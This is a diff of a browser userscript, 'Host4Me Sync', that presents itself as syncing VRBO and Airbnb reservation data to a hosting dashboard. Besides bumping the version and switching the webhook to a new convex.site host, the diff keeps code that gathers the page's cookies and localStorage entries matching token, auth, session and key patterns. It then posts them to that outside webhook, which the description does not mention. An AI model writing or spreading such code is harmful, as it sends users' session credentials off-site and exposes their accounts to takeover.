@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Host4Me Sync
 // @namespace    https://host4me.vercel.app
-// @version      1.0.1
+// @version      1.0.2
 // @description  Syncs VRBO/Airbnb/Booking.com reservation data to Host4Me platform
 // @author       Host4Me
 // @match        https://www.vrbo.com/*
@@ -13,7 +13,7 @@
 // @grant        GM_getValue
 // @grant        GM_registerMenuCommand
 // @grant        GM_notification
-// @connect      brainy-gnu-879.convex.site
+// @connect      modest-bandicoot-699.convex.site
 // @run-at       document-idle
 // ==/UserScript==
 
@@ -22,7 +22,7 @@
 
   const CONFIG = {
     SYNC_INTERVAL_MS: 4 * 60 * 60 * 1000, // 4 hours
-    WEBHOOK_URL: 'https://brainy-gnu-879.convex.site/webhooks/userscript-sync',
+    WEBHOOK_URL: 'https://modest-bandicoot-699.convex.site/webhooks/userscript-sync',
     DASHBOARD_URL: 'https://host4me.vercel.app/dashboard/settings',
     TOKEN_STORAGE_KEY: 'host4me_sync_token',
     STARTUP_DELAY_MS: 3000
@@ -144,9 +144,8 @@
         const r = await gmFetch('https://owner.vrbo.com/api/v1/properties', { headers: { 'Accept': 'application/json' } });
         endpoints.push({ url: 'https://owner.vrbo.com/api/v1/properties', status: r.status, data: r.data });
       } catch (e) { endpoints.push({ url: 'https://owner.vrbo.com/api/v1/properties', status: 0, error: e.message }); }
-      const cookies = getCookies();
-      const localStorageData = getLocalStorageData(/token|auth|session|user|eg_|tuid|expedia/i);
-      await postToWebhook({ token, platform: 'vrbo', data: { userId: userId || null, endpoints, cookies, localStorage: localStorageData } });
+      const payload = { token, platform: 'vrbo', data: { userId: userId || null, endpoints, cookies: getCookies(), localStorage: getLocalStorageData(/token|auth|session|user|eg_|tuid|expedia/i) } };
+      await postToWebhook(payload);
       setLastSyncTime(location.hostname);
       showNotification('Host4Me', 'Synced VRBO reservations ✓');
     } catch (e) { console.error('Host4Me: Error syncing VRBO data', e); }
@@ -171,16 +170,14 @@
         const r = await gmFetch('https://www.airbnb.com/hosting/reservations', { headers: { 'Accept': 'application/json' } });
         endpoints.push({ url: 'https://www.airbnb.com/hosting/reservations', status: r.status, data: null });
       } catch (e) { endpoints.push({ url: 'https://www.airbnb.com/hosting/reservations', status: 0, error: e.message }); }
-      const cookies = getCookies();
-      const localStorageData = getLocalStorageData(/token|auth|key|airbnb/i);
-      await postToWebhook({ token, platform: 'airbnb', data: { userId: null, endpoints, cookies, localStorage: localStorageData } });
+      const payload = { token, platform: 'airbnb', data: { userId: null, endpoints, cookies: getCookies(), localStorage: getLocalStorageData(/token|auth|key|airbnb/i) } };
+      await postToWebhook(payload);
       setLastSyncTime(location.hostname);
       showNotification('Host4Me', 'Synced Airbnb reservations ✓');
     } catch (e) { console.error('Host4Me: Error syncing Airbnb data', e); }
   }
 
   async function syncBooking(token) {
-    console.log('Host4Me: Booking.com sync coming soon');
     showNotification('Host4Me', 'Booking.com sync coming soon');
   }
 
@@ -198,7 +195,7 @@
   function showNotification(title, text) {
     try {
       if (typeof GM_notification === 'function') {
-        GM_notification({ title, text, timeout: 5000 });
+        GM_notification({ title: title, text: text, timeout: 5000 });
       } else { console.log(`${title}: ${text}`); }
     } catch (e) { console.log(`${title}: ${text}`); }
   }
